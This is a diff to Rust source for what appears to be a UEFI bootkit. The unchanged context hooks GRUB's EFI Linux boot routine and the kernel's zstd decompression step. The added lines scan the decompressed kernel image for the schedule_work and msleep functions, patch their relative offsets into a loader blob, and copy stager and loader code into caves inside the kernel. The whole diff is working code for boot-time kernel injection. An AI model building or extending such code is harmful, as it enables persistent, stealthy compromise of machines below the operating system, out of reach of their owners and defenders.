@@ -30,6 +30,12 @@ const SET_MEMORY_X_REL_SENTINEL: u32 = 0x55667788;
 const LOADER_JMP_REL_SENTINEL: u32 = 0x99AABBCC;
 const REQUEST_MODULE_REL_SENTINEL: u32 = 0xDDEEFF00;
 const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
+const SCHEDULE_WORK_PATTERN: &[u8] = &[0x48, 0x89, 0xFA, 0xBF, 0x00, 0x20, 0x00, 0x00];
+const SCHEDULE_WORK_DISTANCE: u8 = 8;
+const MSLEEP_PATTERN: &[u8] = &[0x48, 0x89, 0xC3, 0x66, 0x90, 0x41, 0xC7, 0x44, 0x24, 0x18, 0x02];
+const MSLEEP_DISTANCE: u8 = 0x1E;
+const SCHEDULE_WORK_REL_SENTINEL: u32 = 0xAABBCCDD;
+const MSLEEP_REL_SENTINEL: u32 = 0x11AABBCC;
 
 /// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
 /// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
@@ -277,6 +283,50 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         set_memory_x_phys, set_memory_x_virt
     );
 
+    // Find schedule_work via byte pattern.
+    let mut schedule_work_phys =
+        match binary_search(dst, dst_capacity, SCHEDULE_WORK_PATTERN) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to find schedule_work in kernel");
+                return ret_val;
+            }
+        };
+    schedule_work_phys -= SCHEDULE_WORK_DISTANCE as usize;
+    let schedule_work_virt =
+        match translate_physical_to_virtual(dst, dst_capacity, schedule_work_phys) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to translate schedule_work to virtual address");
+                return ret_val;
+            }
+        };
+    debug!(
+        "schedule_work: phys={:#x}, virt={:#x}",
+        schedule_work_phys, schedule_work_virt
+    );
+
+    // Find msleep via byte pattern.
+    let mut msleep_phys = match binary_search(dst, dst_capacity, MSLEEP_PATTERN) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to find msleep in kernel");
+            return ret_val;
+        }
+    };
+    msleep_phys -= MSLEEP_DISTANCE as usize;
+    let msleep_virt = match translate_physical_to_virtual(dst, dst_capacity, msleep_phys) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to translate msleep to virtual address");
+            return ret_val;
+        }
+    };
+    debug!(
+        "msleep: phys={:#x}, virt={:#x}",
+        msleep_phys, msleep_virt
+    );
+
     let stager_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, stager_cave) {
         Some(addr) => addr,
         None => {
@@ -377,6 +427,39 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     }
 
     // ── Write both blobs ───────────────────────────────────────────────────────
+    let sentinel = SCHEDULE_WORK_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let rel32 =
+            (schedule_work_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!(
+                "schedule_work too far from loader cave for rel32: delta={:#x}",
+                rel32
+            );
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find SCHEDULE_WORK_REL_SENTINEL in loader");
+        return ret_val;
+    }
+
+    let sentinel = MSLEEP_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let rel32 = (msleep_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!(
+                "msleep too far from loader cave for rel32: delta={:#x}",
+                rel32
+            );
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find MSLEEP_REL_SENTINEL in loader");
+        return ret_val;
+    }
+
     unsafe {
         core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
         core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
